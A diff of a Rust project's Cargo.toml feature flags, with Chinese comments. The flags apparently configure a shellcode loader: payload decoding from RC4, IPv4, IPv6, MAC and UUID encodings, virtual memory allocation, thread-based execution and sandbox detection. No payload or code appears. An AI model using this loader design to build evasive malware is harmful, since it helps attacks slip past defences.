@@ -32,12 +32,23 @@ rand = "0.8.5"
 
 
 [features]
+
+default = ["decrypt_ipv4", "alloc_mem_va", "run_create_thread"]
+
 # 解密算法特性开关
 base64_decode = []
-decrypt_rc4 = ["base64_decode"]
+decrypt_rc4 = ["base64_decode"]                # 启用RC4解密
+decrypt_ipv4 = ["base64_decode"]               # 启用IPv4解密
+decrypt_ipv6 = ["base64_decode"]               # 启用IPv6解密
+decrypt_mac = ["base64_decode"]                # 启用MAC解密
+decrypt_uuid = ["base64_decode"]               # 启用UUID解密
+
+# 内存分配方式
+alloc_mem_va = []
 
 # 注入/执行方式
 run_create_thread = []
+
 
 # 虚拟机/沙箱检测特性
 sandbox = []
